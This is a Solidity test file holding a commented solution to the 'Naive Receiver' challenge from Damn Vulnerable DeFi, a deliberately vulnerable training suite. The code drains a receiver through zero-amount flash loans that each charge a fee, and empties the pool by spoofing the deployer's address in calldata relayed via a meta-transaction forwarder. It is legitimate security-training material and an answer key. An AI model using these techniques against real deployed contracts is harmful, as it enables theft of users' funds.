// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
    * SOLUTION coded and commented below
    */ 
    function test_naiveReceiver() public checkSolvedByPlayer {
        /*
        * === GOAL: Drain both the receiver and pool in ≤2 transactions ===
        *
        * The challenge requires the following to be true at the end:
        * 1. Player has executed 2 or fewer transactions (nonce ≤ 2)
        * 2. Flash loan receiver has 0 WETH
        * 3. Pool has 0 WETH
        * 4. Recovery account has 1010 WETH (1000 from pool + 10 from receiver)
        *
        * We achieve this in a single meta-transaction using:
        * - `multicall` to batch multiple operations
        * - Flash loan abuse (0 amount, but 1 WETH fee each)
        * - Meta-transaction spoofing via `BasicForwarder` to impersonate the deployer
        */

        // Prepare an array to hold 11 encoded function calls
        bytes[] memory callDatas = new bytes[](11);

        /*
        * === PART 1: Drain the receiver with 10 flash loans ===
        *
        * The FlashLoanReceiver pays a 1 WETH fee for *every* flash loan,
        * regardless of the amount borrowed. We exploit this by taking 10 flash loans of 0 WETH.
        *
        * Since the receiver starts with exactly 10 WETH, after 10 flash loans,
        * it will be completely drained — even though no real funds were borrowed.
        *
        * Each call: flashLoan(receiver, WETH, 0, "")
        * → Triggers onFlashLoan on receiver → charges 1 WETH fee
        */
        for (uint i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(
                pool.flashLoan,
                (receiver, address(weth), 0, "")
            );
        }

        /*
        * === PART 2: Withdraw all funds from the pool to the recovery account ===
        *
        * The `withdraw` function in NaiveReceiverPool is protected:
        * Only the fee receiver (deployer) can call it.
        *
        * However, the contract uses a meta-transaction forwarder and overrides `_msgSender()`.
        * If the call comes through the forwarder and calldata is >=20 bytes,
        * it reads the last 20 bytes of `msg.data` as the sender.
        *
        * We will:
        * 1. Encode the `withdraw` call
        * 2. Append the deployer's address at the end of the calldata
        * → This tricks `_msgSender()` into returning `deployer`, bypassing access control
        */
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                pool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            bytes32(uint256(uint160(deployer))) // Spoof sender: last 20 bytes = deployer address
        );

        /*
        * === PART 3: Bundle all operations into a single `multicall` ===
        *
        * We use `multicall(bytes[] memory)` to execute all 11 operations in one transaction:
        * - 10 flash loans → drain receiver
        * - 1 withdrawal → drain pool and send 1010 WETH to recovery
        *
        * This ensures we stay within the "≤2 transactions" limit.
        */
        bytes memory multicallData = abi.encodeCall(pool.multicall, (callDatas));

        /*
        * === PART 4: Create a meta-transaction request via BasicForwarder ===
        *
        * The BasicForwarder allows us to send a signed request instead of a direct transaction.
        * This counts as **one transaction** from the player's perspective (nonce increases by 1).
        *
        * The forwarder will:
        * - Verify the signature
        * - Relay the call to the pool
        * - The pool sees `msg.sender` as the forwarder, but `_msgSender()` reads the spoofed sender
        */
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            multicallData,
            1 days
        );

        /*
        * === PART 5: Hash the request using EIP-712 (ERC-2771) standard ===
        *
        * The forwarder uses EIP-712 to securely hash and sign meta-transactions.
        * This ensures the request cannot be tampered with and is valid only for:
        * - This contract (forwarder)
        * - This chain (chain ID included in domain separator)
        * - This deadline and nonce
        *
        * We compute the hash as: keccak256("\x19\x01" || domainSeparator || requestDataHash)
        */
        bytes32 requestHash = keccak256(
            abi.encodePacked(
            "\x19\x01",                    // EIP-712 header
            forwarder.domainSeparator(),   // Ensures domain (chain ID, verifying contract) is bound
            forwarder.getDataHash(request) // Hash of the request struct (EIP-712 typed data)
            )
        );

        /*
        * === PART 6: Sign the hash with the player's private key ===
        *
        * We simulate signing using Hardhat's `vm.sign()`. In a real-world scenario,
        * the player would sign off-chain and submit the signature to a relayer.
        *
        * The signature consists of (v, r, s) components.
        */
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v); // Standard ECDSA signature format

        /*
        * === PART 7: Execute the meta-transaction via the forwarder ===
        *
        * Calling `execute()` on the forwarder:
        * - Verifies the signature matches the `player`
        * - Checks the nonce and deadline
        * - Then calls `address(pool).call(multicallData)`
        *
        * This triggers the `multicall` on the pool, which:
        * 1. Executes 10 flash loans → drains 10 WETH from the receiver
        * 2. Executes `withdraw` with spoofed `_msgSender()` → sends 1010 WETH to recovery
        *
        * All of this happens in **a single external transaction** from the player.
        * So: player's nonce increases by only 1 → satisfies "≤2 transactions" rule.
        */
        forwarder.execute(request, signature);
    }


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
